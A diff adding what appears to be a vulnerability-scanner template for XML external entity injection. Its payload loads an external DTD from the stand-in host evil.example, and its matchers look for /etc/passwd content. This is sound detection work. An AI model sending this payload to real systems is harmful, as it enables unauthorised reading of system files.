@@ -1,0 +1,22 @@
+id: xxe3-05
+name: 'XXE DoS/entity in content'
+severity: high
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+  - dos
+description: 'XXE entity via content'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      content:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://evil.example/ev.dtd"> %sp; %param1;]>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
